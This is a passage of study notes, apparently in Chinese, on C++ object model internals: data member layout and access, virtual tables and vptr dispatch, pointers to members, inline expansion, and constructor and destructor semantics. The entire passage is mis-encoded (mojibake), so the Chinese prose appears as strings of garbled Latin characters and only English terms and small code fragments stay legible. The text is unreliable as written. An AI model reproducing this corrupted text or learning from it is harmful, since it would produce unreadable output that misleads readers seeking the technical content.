membersæ°¸è¿œåªå­˜åœ¨ä¸€ä»½å®ä¾‹ï¼ˆè¯‘æ³¨ï¼šç”šè‡³å³ä½¿è¯¥classæ²¡æœ‰ä»»ä½•objectå®ä¾‹ï¼Œå…¶static data membersä¹Ÿå·²å­˜åœ¨ï¼‰ã€‚ 3.1 Data Memberçš„ç»‘å®š åœ¨ä¸€ä¸ªinline member functionä½“ä¹‹å†…çš„ä¸€ä¸ªdata memberç»‘å®šæ“ä½œï¼Œä¼šåœ¨æ•´ä¸ªclasså£°æ˜å®Œæˆä¹‹åæ‰å‘ç”Ÿã€‚ç„¶è€Œï¼Œè¿™å¯¹äºmember functionçš„argument listå¹¶ä¸ä¸ºçœŸã€‚Argument listä¸­çš„åç§°è¿˜æ˜¯ä¼šåœ¨å®ƒä»¬ç¬¬ä¸€æ¬¡é­é‡æ—¶è¢«é€‚å½“åœ°å†³è®®ï¼ˆresolvedï¼‰å®Œæˆã€‚ éœ€è¦æŸç§é˜²å¾¡æ€§ç¨‹åºé£æ ¼ï¼šè¯·æ€»æ˜¯æŠŠâ€œnested typeå£°æ˜â€æ”¾åœ¨classçš„èµ·å§‹å¤„ã€‚ 3.2 Data Memberçš„å¸ƒå±€ Nonstatic data membersåœ¨class objectä¸­çš„æ’åˆ—é¡ºåºå°†å’Œå…¶è¢«å£°æ˜çš„é¡ºåºä¸€æ ·ï¼Œä»»ä½•ä¸­é—´ä»‹å…¥çš„static data memberséƒ½ä¸ä¼šè¢«æ”¾è¿›å¯¹è±¡å¸ƒå±€ä¹‹ä¸­ã€‚ ç¼–è¯‘å™¨è¿˜å¯èƒ½ä¼šåˆæˆä¸€äº›å†…éƒ¨ä½¿ç”¨çš„data membersï¼Œä»¥æ”¯æŒæ•´ä¸ªå¯¹è±¡æ¨¡å‹ã€‚vptrå°±æ˜¯è¿™æ ·çš„ä¸œè¥¿ï¼Œç›®å‰æ‰€æœ‰çš„ç¼–è¯‘å™¨éƒ½æŠŠå®ƒå®‰æ’åœ¨æ¯ä¸€ä¸ªâ€œå†…å«virtual functionä¹‹classâ€çš„ object å†…ã€‚ä¸€äº›ç¼–è¯‘å™¨æŠŠvptræ”¾åœ¨ä¸€ä¸ªclass objectçš„æœ€å‰ç«¯ã€‚ åœ¨VCä¸­æ•°æ®æˆå‘˜çš„å¸ƒå±€é¡ºåºä¸ºï¼š vptréƒ¨åˆ†ï¼ˆå¦‚æœåŸºç±»æœ‰ï¼Œåˆ™ç»§æ‰¿åŸºç±»çš„ï¼‰ vbptr ï¼ˆå¦‚æœéœ€è¦ï¼‰ åŸºç±»æˆå‘˜ï¼ˆæŒ‰å£°æ˜é¡ºåºï¼‰ è‡ªèº«æ•°æ®æˆå‘˜ è™šåŸºç±»æ•°æ®æˆå‘˜ï¼ˆæŒ‰å£°æ˜é¡ºåºï¼‰ 3.3 Data Memberçš„å­˜å– Static Data Members æ¯ä¸€ä¸ªstatic data memberåªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå­˜æ”¾åœ¨ç¨‹åºçš„data segmentä¹‹ä¸­ã€‚æ¯æ¬¡ç¨‹åºå‚é˜…ï¼ˆå–ç”¨ï¼‰static memberæ—¶ï¼Œå°±ä¼šè¢«å†…éƒ¨è½¬åŒ–ä¸ºå¯¹è¯¥å”¯ä¸€externå®ä¾‹çš„ç›´æ¥å‚è€ƒæ“ä½œã€‚ static memberå¹¶ä¸å†…å«åœ¨ä¸€ä¸ªclass objectä¹‹ä¸­ã€‚ è‹¥åç§°å†²çªï¼Œç¼–è¯‘å™¨çš„è§£å†³æ–¹æ³•æ˜¯æš—ä¸­å¯¹æ¯ä¸€ä¸ªstatic data memberç¼–ç ï¼ˆè¿™ç§æ‰‹æ³•æœ‰ä¸ªå¾ˆç¾çš„åç§°ï¼šname-manglingï¼‰ï¼Œä»¥è·å¾—ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„ç¨‹åºè¯†åˆ«ä»£ç ã€‚ Nonstatic Data Members Nonstatic data membersç›´æ¥å­˜æ”¾åœ¨æ¯ä¸€ä¸ªclass object ä¹‹ä¸­ã€‚é™¤éç»ç”±æ˜¾å¼çš„ï¼ˆexplicitï¼‰æˆ–éšå¼çš„ï¼ˆimplicitï¼‰class objectï¼Œå¦åˆ™æ²¡æœ‰åŠæ³•ç›´æ¥å­˜å–å®ƒä»¬ã€‚ æ¬²å¯¹ä¸€ä¸ªnonstatic data memberè¿›è¡Œå­˜å–æ“ä½œï¼Œç¼–è¯‘å™¨éœ€è¦æŠŠclass objectçš„èµ·å§‹åœ°å€åŠ ä¸Šdata memberçš„åç§»ä½ç½®ï¼ˆoffsetï¼‰ã€‚ 3.4 â€œç»§æ‰¿â€ä¸Data Member åœ¨C++ç»§æ‰¿æ¨¡å‹ä¸­ï¼Œä¸€ä¸ªderived class objectæ‰€è¡¨ç°å‡ºæ¥çš„ä¸œè¥¿ï¼Œæ˜¯å…¶è‡ªå·±çš„membersåŠ ä¸Šå…¶base classï¼ˆesï¼‰ membersçš„æ€»å’Œã€‚è‡³äºderived class memberså’Œbase classï¼ˆesï¼‰membersçš„æ’åˆ—é¡ºåºï¼Œåˆ™å¹¶æœªåœ¨C++Standardä¸­å¼ºåˆ¶æŒ‡å®šï¼›ç†è®ºä¸Šç¼–è¯‘å™¨å¯ä»¥è‡ªç”±å®‰æ’ä¹‹ã€‚åœ¨å¤§éƒ¨åˆ†ç¼–è¯‘å™¨ä¸Šå¤´ï¼Œbase class membersæ€»æ˜¯å…ˆå‡ºç°ï¼Œä½†å±äºvirtual base classçš„é™¤å¤–ï¼ˆä¸€èˆ¬è€Œè¨€ï¼Œä»»ä½•ä¸€æ¡é€šåˆ™ä¸€æ—¦ç¢°ä¸Švirtual base classå°±æ²¡è¾™äº†ï¼Œè¿™é‡Œäº¦ä¸ä¾‹å¤–ï¼‰ã€‚ åªè¦ç»§æ‰¿ä¸è¦å¤šæ€ï¼ˆInheritance without Polymorphismï¼‰ åŠ ä¸Šå¤šæ€ï¼ˆAdding Polymorphismï¼‰ è™šæ‹Ÿç»§æ‰¿ï¼ˆVirtual Inheritanceï¼‰ å¤šé‡ç»§æ‰¿çš„ä¸€ä¸ªè¯­æ„ä¸Šçš„å‰¯ä½œç”¨å°±æ˜¯ï¼Œå®ƒå¿…é¡»æ”¯æŒæŸç§å½¢å¼çš„â€œshared subobjectç»§æ‰¿â€ã€‚ è™šç»§æ‰¿çš„å­ç±»æœ‰è‡ªå·±çš„ä¸€ä¸ªvptrã€‚ 3.5 å¯¹è±¡æˆå‘˜çš„æ•ˆç‡ å•ä¸€ç»§æ‰¿åº”è¯¥ä¸ä¼šå½±å“æµ‹è¯•çš„æ•ˆç‡ï¼Œå› ä¸ºmembersè¢«è¿ç»­å­˜å‚¨äºderived class objectä¸­ï¼Œå¹¶ä¸”å…¶offsetåœ¨ç¼–è¯‘æ—¶æœŸå°±å·²çŸ¥äº†ã€‚è™šæ‹Ÿç»§æ‰¿çš„æ•ˆç‡ä¼šé™ä½ã€‚ 3.6 æŒ‡å‘Data Membersçš„æŒ‡é’ˆ å¦‚ä½•åŒºåˆ†ä¸€ä¸ªâ€œæ²¡æœ‰æŒ‡å‘ä»»ä½•data memberâ€çš„æŒ‡é’ˆï¼Œå’Œä¸€ä¸ªæŒ‡å‘â€œç¬¬ä¸€ä¸ªdata memberâ€çš„æŒ‡é’ˆï¼Ÿ ä¸ºäº†åŒºåˆ†p1å’Œp2ï¼Œæ¯ä¸€ä¸ªçœŸæ­£çš„member offsetå€¼éƒ½è¢«åŠ ä¸Š1ã€‚ä¸è®ºç¼–è¯‘å™¨æˆ–ä½¿ç”¨è€…éƒ½å¿…é¡»è®°ä½ï¼Œåœ¨çœŸæ­£ä½¿ç”¨è¯¥å€¼ä»¥æŒ‡å‡ºä¸€ä¸ªmemberä¹‹å‰ï¼Œè¯·å…ˆå‡æ‰1ã€‚ å››ã€Functionè¯­æ„å­¦ C++æ”¯æŒä¸‰ç§ç±»å‹çš„member functionsï¼šstaticã€nonstaticå’Œvirtualã€‚ 4.1 Member çš„å„ç§è°ƒç”¨æ–¹å¼ Nonstatic Member Functionsï¼ˆéé™æ€æˆå‘˜å‡½æ•°ï¼‰ C++çš„è®¾è®¡å‡†åˆ™ä¹‹ä¸€å°±æ˜¯ï¼šnonstatic member functionè‡³å°‘å¿…é¡»å’Œä¸€èˆ¬çš„nonmember functionæœ‰ç›¸åŒçš„æ•ˆç‡ã€‚ åç§°çš„ç‰¹æ®Šå¤„ç†ï¼ˆName Manglingï¼‰ä¸€èˆ¬è€Œè¨€ï¼Œmemberçš„åç§°å‰é¢ä¼šè¢«åŠ ä¸Šclassåç§°ï¼Œå½¢æˆç‹¬ä¸€æ— äºŒçš„å‘½åã€‚ Virtual Member Functionsï¼ˆè™šæ‹Ÿæˆå‘˜å‡½æ•°ï¼‰ 1( * ptr-&gt;vptr[1])( ptr ) vptrè¡¨ç¤ºç”±ç¼–è¯‘å™¨äº§ç”Ÿçš„æŒ‡é’ˆï¼ŒæŒ‡å‘virtual tableã€‚å®ƒè¢«å®‰æ’åœ¨æ¯ä¸€ä¸ªâ€œå£°æ˜æœ‰ï¼ˆæˆ–ç»§æ‰¿è‡ªï¼‰ä¸€ä¸ªæˆ–å¤šä¸ª virtual functionsâ€çš„class objectä¸­ã€‚äº‹å®ä¸Šå…¶åç§°ä¹Ÿä¼šè¢«â€œmangledâ€ï¼Œå› ä¸ºåœ¨ä¸€ä¸ªå¤æ‚çš„classæ´¾ç”Ÿä½“ç³»ä¸­ï¼Œå¯èƒ½å­˜åœ¨å¤šä¸ªvptrsã€‚ 1æ˜¯virtual table slotçš„ç´¢å¼•å€¼ï¼Œå…³è”åˆ° normalize()å‡½æ•°ã€‚ ç¬¬äºŒä¸ªptrè¡¨ç¤ºthisæŒ‡é’ˆã€‚ Static Member Functionsï¼ˆé™æ€æˆå‘˜å‡½æ•°ï¼‰ å¦‚æœå–ä¸€ä¸ªstatic member functionçš„åœ°å€ï¼Œè·å¾—çš„å°†æ˜¯å…¶åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯å…¶åœ°å€ã€‚ç”±äºstatic member functionæ²¡æœ‰thisæŒ‡é’ˆï¼Œæ‰€ä»¥å…¶åœ°å€çš„ç±»å‹å¹¶ä¸æ˜¯ä¸€ä¸ªâ€œæŒ‡å‘class member functionçš„æŒ‡é’ˆâ€ï¼Œè€Œæ˜¯ä¸€ä¸ªâ€œnonmemberå‡½æ•°æŒ‡é’ˆâ€ã€‚ 4.2 Virtual Member Functionsï¼ˆè™šæ‹Ÿæˆå‘˜å‡½æ•°ï¼‰ virtual functionçš„ä¸€èˆ¬å®ç°æ¨¡å‹ï¼šæ¯ä¸€ä¸ªclassæœ‰ä¸€ä¸ªvirtual tableï¼Œå†…å«è¯¥classä¹‹ä¸­æœ‰ä½œç”¨çš„virtual functionçš„åœ°å€ï¼Œç„¶åæ¯ä¸ªobjectæœ‰ä¸€ä¸ªvptrï¼ŒæŒ‡å‘virtual tableçš„æ‰€åœ¨ã€‚ åœ¨C++ä¸­ï¼Œå¤šæ€ï¼ˆpolymorphismï¼‰è¡¨ç¤ºâ€œä»¥ä¸€ä¸ªpublic base class çš„æŒ‡é’ˆï¼ˆæˆ–referenceï¼‰ï¼Œå¯»å€å‡ºä¸€ä¸ªderived class objectâ€çš„æ„æ€ã€‚ C++å¯¹â€œç§¯æå¤šæ€ï¼ˆactive polymorphismï¼‰â€çš„å”¯ä¸€æ”¯æŒï¼Œå°±æ˜¯å¯¹äºvirtual function callçš„å†³è®®ï¼ˆresolutionï¼‰æ“ä½œã€‚æœ‰äº†RTTIï¼Œå°±èƒ½å¤Ÿåœ¨æ‰§è¡ŒæœŸæŸ¥è¯¢ä¸€ä¸ªå¤šæ€çš„pointeræˆ–å¤šæ€çš„referenceäº†ã€‚ æ¬²é‰´å®šå“ªäº› classes å±•ç°å¤šæ€ç‰¹æ€§ï¼Œæˆ‘ä»¬éœ€è¦é¢å¤–çš„æ‰§è¡ŒæœŸä¿¡æ¯ã€‚ä¸€å¦‚æˆ‘æ‰€è¯´ï¼Œå…³é”®è¯classå’Œstructå¹¶ä¸èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬ã€‚ç”±äºæ²¡æœ‰å¯¼å…¥åƒæ˜¯polymorphicä¹‹ç±»çš„æ–°å…³é”®è¯ï¼Œå› æ­¤è¯†åˆ«ä¸€ä¸ªclassæ˜¯å¦æ”¯æŒå¤šæ€ï¼Œå”¯ä¸€é€‚å½“çš„æ–¹æ³•å°±æ˜¯çœ‹çœ‹å®ƒæ˜¯å¦æœ‰ä»»ä½•virtual functionã€‚åªè¦classæ‹¥æœ‰ä¸€ä¸ªvirtual functionï¼Œå®ƒå°±éœ€è¦è¿™ä»½é¢å¤–çš„æ‰§è¡ŒæœŸä¿¡æ¯ã€‚ åœ¨å®ç°ä¸Šï¼Œé¦–å…ˆæˆ‘å¯ä»¥åœ¨æ¯ä¸€ä¸ªå¤šæ€çš„class objectèº«ä¸Šå¢åŠ ä¸¤ä¸ªmembersï¼š ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–æ•°å­—ï¼Œè¡¨ç¤ºclassçš„ç±»å‹ï¼› ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘æŸè¡¨æ ¼ï¼Œè¡¨æ ¼ä¸­æŒæœ‰ç¨‹åºçš„virtual functionsçš„æ‰§è¡ŒæœŸåœ°å€ã€‚ ç„¶è€Œï¼Œæ‰§è¡ŒæœŸå¤‡å¦¥é‚£äº›å‡½æ•°åœ°å€ï¼Œåªæ˜¯è§£ç­”çš„ä¸€åŠè€Œå·²ã€‚å¦ä¸€åŠè§£ç­”æ˜¯æ‰¾åˆ°é‚£äº›åœ°å€ã€‚ä¸¤ä¸ªæ­¥éª¤å¯ä»¥å®Œæˆè¿™é¡¹ä»»åŠ¡ï¼š ä¸ºäº†æ‰¾åˆ°è¡¨æ ¼ï¼Œæ¯ä¸€ä¸ªclass objectè¢«å®‰æ’äº†ä¸€ä¸ªç”±ç¼–è¯‘å™¨å†…éƒ¨äº§ç”Ÿçš„æŒ‡é’ˆï¼ŒæŒ‡å‘è¯¥è¡¨æ ¼ã€‚ ä¸ºäº†æ‰¾åˆ°å‡½æ•°åœ°å€ï¼Œæ¯ä¸€ä¸ªvirtual functionè¢«æŒ‡æ´¾ä¸€ä¸ªè¡¨æ ¼ç´¢å¼•å€¼ã€‚ è¿™äº›å·¥ä½œéƒ½ç”±ç¼–è¯‘å™¨å®Œæˆã€‚æ‰§è¡ŒæœŸè¦åšçš„ï¼Œåªæ˜¯åœ¨ç‰¹å®šçš„virtual table slotï¼ˆè®°å½•ç€virtual functionçš„åœ°å€ï¼‰ä¸­æ¿€æ´»virtual functionã€‚ ä¸€ä¸ªclassåªä¼šæœ‰ä¸€ä¸ªvirtual tableã€‚æ¯ä¸€ä¸ªtableå†…å«å…¶å¯¹åº”ä¹‹class objectä¸­æ‰€æœ‰active virtual functionså‡½æ•°å®ä¾‹çš„åœ°å€ã€‚ ç°åœ¨ï¼Œå¦‚æœæˆ‘æœ‰è¿™æ ·çš„å¼å­ï¼šptr-&gt;z() æˆ‘å¦‚ä½•æœ‰è¶³å¤Ÿçš„çŸ¥è¯†åœ¨ç¼–è¯‘æ—¶æœŸè®¾å®švirtual functionçš„è°ƒç”¨å‘¢ï¼Ÿ ä¸€èˆ¬è€Œè¨€ï¼Œåœ¨æ¯æ¬¡è°ƒç”¨ z()æ—¶ï¼Œæˆ‘å¹¶ä¸çŸ¥é“ptræ‰€æŒ‡å¯¹è±¡çš„çœŸæ­£ç±»å‹ã€‚ç„¶è€Œæˆ‘çŸ¥é“ï¼Œç»ç”± ptrå¯ä»¥å­˜å–åˆ°è¯¥å¯¹è±¡çš„virtual tableã€‚ è™½ç„¶æˆ‘ä¸çŸ¥é“å“ªä¸€ä¸ªz()å‡½æ•°å®ä¾‹ä¼šè¢«è°ƒç”¨ï¼Œä½†æˆ‘çŸ¥é“æ¯ä¸€ä¸ªz()å‡½æ•°åœ°å€éƒ½è¢«æ”¾åœ¨slot 4ä¸­ã€‚è¿™äº›ä¿¡æ¯ä½¿å¾—ç¼–è¯‘å™¨å¯ä»¥å°†è¯¥è°ƒç”¨è½¬åŒ–ä¸ºï¼š(*ptr-&gt;vptr[4])(ptr) å¤šé‡ç»§æ‰¿ä¸‹çš„Virtual Functions åœ¨å¤šé‡ç»§æ‰¿ä¸­æ”¯æŒvirtual functionsï¼Œå…¶å¤æ‚åº¦å›´ç»•åœ¨ç¬¬äºŒä¸ªåŠåç»§çš„base classesèº«ä¸Šï¼Œä»¥åŠâ€œå¿…é¡»åœ¨æ‰§è¡ŒæœŸè°ƒæ•´thisæŒ‡é’ˆâ€è¿™ä¸€ç‚¹ã€‚ è™šæ‹Ÿç»§æ‰¿ä¸‹çš„Virtual Functions å³ä¸‹è§’çš„vtblæœ‰é—®é¢˜ï¼ŒæŒ‡çš„åº”è¯¥æ˜¯Point2dçš„å‡½æ•°åœ°å€ã€‚ 4.3 å‡½æ•°çš„æ•ˆèƒ½ nonmemberã€static memberæˆ–nonstatic memberå‡½æ•°éƒ½è¢«è½¬åŒ–ä¸ºå®Œå…¨ç›¸åŒçš„å½¢å¼ã€‚æ‰€ä»¥æˆ‘ä»¬æ¯«ä¸æƒŠè®¶åœ°çœ‹åˆ°ä¸‰è€…çš„æ•ˆç‡å®Œå…¨ç›¸åŒã€‚ 4.4 æŒ‡å‘Member Functionçš„æŒ‡é’ˆ å–ä¸€ä¸ªnonstatic data memberçš„åœ°å€ï¼Œå¾—åˆ°çš„ç»“æœæ˜¯è¯¥memberåœ¨classå¸ƒå±€ä¸­çš„bytesä½ç½®ï¼ˆå†åŠ 1ï¼‰ã€‚ä½ å¯ä»¥æƒ³è±¡å®ƒæ˜¯ä¸€ä¸ªä¸å®Œæ•´çš„å€¼ï¼Œå®ƒéœ€è¦è¢«ç»‘å®šäºæŸä¸ªclass objectçš„åœ°å€ä¸Šï¼Œæ‰èƒ½å¤Ÿè¢«å­˜å–ã€‚å–ä¸€ä¸ªnonstatic member functionçš„åœ°å€ï¼Œå¦‚æœè¯¥å‡½æ•°æ˜¯nonvirtualï¼Œå¾—åˆ°çš„ç»“æœæ˜¯å®ƒåœ¨å†…å­˜ä¸­çœŸæ­£çš„åœ°å€ã€‚ç„¶è€Œè¿™ä¸ªå€¼ä¹Ÿæ˜¯ä¸å®Œå…¨çš„ã€‚å®ƒä¹Ÿéœ€è¦è¢«ç»‘å®šäºæŸä¸ªclass objectçš„åœ°å€ä¸Šï¼Œæ‰èƒ½å¤Ÿé€šè¿‡å®ƒè°ƒç”¨è¯¥å‡½æ•°ã€‚æ‰€æœ‰çš„nonstatic member functionséƒ½éœ€è¦å¯¹è±¡çš„åœ°å€ï¼ˆä»¥å‚æ•°thisæŒ‡å‡ºï¼‰ã€‚ ä½¿ç”¨ä¸€ä¸ªâ€œmember functionæŒ‡é’ˆâ€ï¼Œå¦‚æœå¹¶ä¸ç”¨äºvirtual functionã€å¤šé‡ç»§æ‰¿ã€virtual base classç­‰æƒ…å†µçš„è¯ï¼Œå¹¶ä¸ä¼šæ¯”ä½¿ç”¨ä¸€ä¸ªâ€œnonmember functionæŒ‡é’ˆâ€çš„æˆæœ¬æ›´é«˜ã€‚ æ”¯æŒâ€œæŒ‡å‘ Virtual Member Functionsâ€çš„æŒ‡é’ˆ å¯¹ä¸€ä¸ªnonstatic member functionå–å…¶åœ°å€ï¼Œå°†è·å¾—è¯¥å‡½æ•°åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚ç„¶è€Œé¢å¯¹ä¸€ä¸ªvirtual functionï¼Œå…¶åœ°å€åœ¨ç¼–è¯‘æ—¶æœŸæ˜¯æœªçŸ¥çš„ï¼Œæ‰€èƒ½çŸ¥é“çš„ä»…æ˜¯virtual functionåœ¨å…¶ç›¸å…³ä¹‹virtual tableä¸­çš„ç´¢å¼•å€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹ä¸€ä¸ªvirtual member functionå–å…¶åœ°å€ï¼Œæ‰€èƒ½è·å¾—çš„åªæ˜¯ä¸€ä¸ªç´¢å¼•å€¼ã€‚ â€œæŒ‡å‘ Member Functionsä¹‹æŒ‡é’ˆâ€çš„æ•ˆç‡ ä¸€ä¸ªâ€œæŒ‡å‘member functionçš„æŒ‡é’ˆâ€ï¼Œæ˜¯ä¸€ä¸ªç»“æ„ï¼Œå†…å«ä¸‰ä¸ªå­—æ®µï¼šindexã€faddrå’Œdeltaã€‚indexè‹¥ä¸æ˜¯å†…å«ä¸€ä¸ªç›¸å…³virtual tableçš„ç´¢å¼•å€¼ï¼Œå°±æ˜¯ä»¥-1è¡¨ç¤ºå‡½æ•°æ˜¯nonvirtualã€‚faddræŒæœ‰nonvirtual member function çš„åœ°å€ã€‚deltaæŒæœ‰ä¸€ä¸ªå¯èƒ½çš„thisæŒ‡é’ˆè°ƒæ•´å€¼ã€‚ 4.5 Inline Functions ä¸€èˆ¬è€Œè¨€ï¼Œå¤„ç†ä¸€ä¸ªinlineå‡½æ•°ï¼Œæœ‰ä¸¤ä¸ªé˜¶æ®µï¼š åˆ†æå‡½æ•°å®šä¹‰ï¼Œä»¥å†³å®šå‡½æ•°çš„â€œintrinsic inline abilityâ€ï¼ˆæœ¬è´¨çš„ inlineèƒ½åŠ›ï¼‰ã€‚â€œintrinsicâ€ï¼ˆæœ¬è´¨çš„ã€å›ºæœ‰çš„ï¼‰ä¸€è¯åœ¨è¿™é‡Œæ„æŒ‡â€œä¸ç¼–è¯‘å™¨ç›¸å…³â€ã€‚å¦‚æœå‡½æ•°å› å…¶å¤æ‚åº¦ï¼Œæˆ–å› å…¶å»ºæ„é—®é¢˜ï¼Œè¢«åˆ¤æ–­ä¸å¯æˆä¸ºinlineï¼Œå®ƒä¼šè¢«è½¬ä¸ºä¸€ä¸ªstaticå‡½æ•°ï¼Œå¹¶åœ¨â€œè¢«ç¼–è¯‘æ¨¡å—â€å†…äº§ç”Ÿå¯¹åº”çš„å‡½æ•°å®šä¹‰ã€‚ çœŸæ­£çš„inlineå‡½æ•°æ‰©å±•æ“ä½œæ˜¯åœ¨è°ƒç”¨çš„é‚£ä¸€ç‚¹ä¸Šã€‚è¿™ä¼šå¸¦æ¥å‚æ•°çš„æ±‚å€¼æ“ä½œï¼ˆevaluationï¼‰ä»¥åŠä¸´æ—¶æ€§å¯¹è±¡çš„ç®¡ç†ã€‚ å±€éƒ¨å˜é‡ï¼ˆLocal Variablesï¼‰ ä¸€èˆ¬è€Œè¨€ï¼Œinlineå‡½æ•°ä¸­çš„æ¯ä¸€ä¸ªå±€éƒ¨å˜é‡éƒ½å¿…é¡»è¢«æ”¾åœ¨å‡½æ•°è°ƒç”¨çš„ä¸€ä¸ªå°é—­åŒºæ®µä¸­ï¼Œæ‹¥æœ‰ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„åç§°ã€‚å¦‚æœinlineå‡½æ•°ä»¥å•ä¸€è¡¨è¾¾å¼ï¼ˆexpressionï¼‰æ‰©å±•å¤šæ¬¡ï¼Œåˆ™æ¯æ¬¡æ‰©å±•éƒ½éœ€è¦è‡ªå·±çš„ä¸€ç»„å±€éƒ¨å˜é‡ã€‚å¦‚æœinlineå‡½æ•°ä»¥åˆ†ç¦»çš„å¤šä¸ªå¼å­ï¼ˆdiscrete statementsï¼‰è¢«æ‰©å±•å¤šæ¬¡ï¼Œé‚£ä¹ˆåªéœ€ä¸€ç»„å±€éƒ¨å˜é‡ï¼Œå°±å¯ä»¥é‡å¤ä½¿ç”¨ï¼ˆè¯‘æ³¨ï¼šå› ä¸ºå®ƒä»¬è¢«æ”¾åœ¨ä¸€ä¸ªå°é—­åŒºæ®µä¸­ï¼Œæœ‰è‡ªå·±çš„scopeï¼‰ã€‚ ç„¶è€Œä¸€ä¸ªinlineå‡½æ•°å¦‚æœè¢«è°ƒç”¨å¤ªå¤šæ¬¡çš„è¯ï¼Œä¼šäº§ç”Ÿå¤§é‡çš„æ‰©å±•ç ï¼Œä½¿ç¨‹åºå¤§å°æš´æ¶¨ã€‚ äº”ã€æ„é€ ã€ææ„ã€æ‹·è´è¯­æ„å­¦ ä¸€èˆ¬è€Œè¨€ï¼Œclassçš„data memberåº”è¯¥è¢«åˆå§‹åŒ–ï¼Œå¹¶ä¸”åªåœ¨constructorä¸­æˆ–æ˜¯åœ¨classçš„å…¶ä»–member functionsä¸­æŒ‡å®šåˆå€¼ã€‚å…¶ä»–ä»»ä½•æ“ä½œéƒ½å°†ç ´åå°è£…æ€§è´¨ï¼Œä½¿classçš„ç»´æŠ¤å’Œä¿®æ”¹æ›´åŠ å›°éš¾ã€‚ 5.1 â€œæ— ç»§æ‰¿â€æƒ…å†µä¸‹çš„å¯¹è±¡æ„é€  å¯ä»¥å®šä¹‰å’Œè°ƒç”¨ï¼ˆinvokeï¼‰ä¸€ä¸ªpure virtual functionï¼›ä¸è¿‡å®ƒåªèƒ½è¢«é™æ€åœ°è°ƒç”¨ï¼ˆinvoked staticallyï¼‰ï¼Œä¸èƒ½ç»ç”±è™šæ‹Ÿæœºåˆ¶è°ƒç”¨ã€‚ å”¯ä¸€çš„ä¾‹å¤–å°±æ˜¯pure virtual destructorï¼šclassè®¾è®¡è€…ä¸€å®šå¾—å®šä¹‰å®ƒã€‚ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºæ¯ä¸€ä¸ªderived class destructorä¼šè¢«ç¼–è¯‘å™¨åŠ ä»¥æ‰©å¼ ï¼Œä»¥é™æ€è°ƒç”¨çš„æ–¹å¼è°ƒç”¨å…¶â€œæ¯ä¸€ä¸ªvirtual base classâ€ä»¥åŠâ€œä¸Šä¸€å±‚base classâ€çš„destructorã€‚å› æ­¤ï¼Œåªè¦ç¼ºä¹ä»»ä½•ä¸€ä¸ªbase class destructorsçš„å®šä¹‰ï¼Œå°±ä¼šå¯¼è‡´é“¾æ¥å¤±è´¥ã€‚ è¿™æ ·çš„è®¾è®¡æ˜¯ä»¥C++è¯­è¨€çš„ä¸€ä¸ªä¿è¯ä¸ºå‰æï¼šç»§æ‰¿ä½“ç³»ä¸­æ¯ä¸€ä¸ªclass objectçš„destructorséƒ½ä¼šè¢«è°ƒç”¨ã€‚æ‰€ä»¥ç¼–è¯‘å™¨ä¸èƒ½å¤Ÿå‹æŠ‘è¿™ä¸€è°ƒç”¨æ“ä½œã€‚ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ›¿ä»£æ–¹æ¡ˆå°±æ˜¯ï¼Œä¸è¦æŠŠvirtual destructorå£°æ˜ä¸ºpureã€‚ 5.2 ç»§æ‰¿ä½“ç³»ä¸‹çš„å¯¹è±¡æ„é€  constructorçš„æ‰§è¡Œç®—æ³•é€šå¸¸å¦‚ä¸‹ï¼š åœ¨derived class constructorä¸­ï¼Œâ€œæ‰€æœ‰virtual base classesâ€åŠâ€œä¸Šä¸€å±‚base classâ€çš„ constructorsä¼šè¢«è°ƒç”¨ã€‚ ä¸Šè¿°å®Œæˆä¹‹åï¼Œå¯¹è±¡çš„vptr(s)è¢«åˆå§‹åŒ–ï¼ŒæŒ‡å‘ç›¸å…³çš„virtual table(s)ã€‚ å¦‚æœæœ‰member initialization listçš„è¯ï¼Œå°†åœ¨constructorä½“å†…æ‰©å±•å¼€æ¥ã€‚è¿™å¿…é¡»åœ¨vptrè¢«è®¾å®šä¹‹åæ‰åšï¼Œä»¥å…æœ‰ä¸€ä¸ªvirtual member functionè¢«è°ƒç”¨ã€‚ æœ€åï¼Œæ‰§è¡Œç¨‹åºå‘˜æ‰€æä¾›çš„ä»£ç ã€‚ 5.3 å¯¹è±¡å¤åˆ¶è¯­æ„å­¦ï¼ˆObject Copy Semanticsï¼‰ å°½å¯èƒ½ä¸è¦å…è®¸ä¸€ä¸ªvirtual base classçš„æ‹·è´æ“ä½œã€‚æˆ‘ç”šè‡³æä¾›ä¸€ä¸ªæ¯”è¾ƒå¥‡æ€ªçš„å»ºè®®ï¼šä¸è¦åœ¨ä»»ä½•virtual base classä¸­å£°æ˜æ•°æ®ã€‚ 5.4 ææ„è¯­æ„å­¦ï¼ˆSemantics of Destructionï¼‰ å¦‚æœclassæ²¡æœ‰å®šä¹‰destructorï¼Œé‚£ä¹ˆåªæœ‰åœ¨classå†…å«çš„member object ï¼ˆæˆ–classè‡ªå·±çš„base classï¼‰æ‹¥æœ‰destructorçš„æƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨æ‰ä¼šè‡ªåŠ¨åˆæˆå‡ºä¸€ä¸ªæ¥ã€‚å¦åˆ™ï¼Œdestructorè¢«è§†ä¸ºä¸éœ€è¦ï¼Œä¹Ÿå°±ä¸éœ€è¢«åˆæˆï¼ˆå½“ç„¶æ›´ä¸éœ€è¦è¢«è°ƒç”¨ï¼‰ã€‚ å°ç»“ å³ä½¿æ˜¯ä¸€ä¸ªæŠ½è±¡åŸºç±»ï¼Œå¦‚æœå®ƒæœ‰éé™æ€æ•°æ®æˆå‘˜ï¼Œä¹Ÿåº”è¯¥ç»™å®ƒæä¾›ä¸€ä¸ªå¸¦å‚æ•°çš„æ„é€ å‡½æ•°ï¼Œæ¥åˆå§‹åŒ–å®ƒçš„æ•°æ®æˆå‘˜ã€‚ç±»çš„data memberåº”å½“è¢«åˆå§‹åŒ–ï¼Œä¸”åªåœ¨å…¶æ„é€ å‡½æ•°æˆ–å…¶member functionä¸­åˆå§‹åŒ–ã€‚ 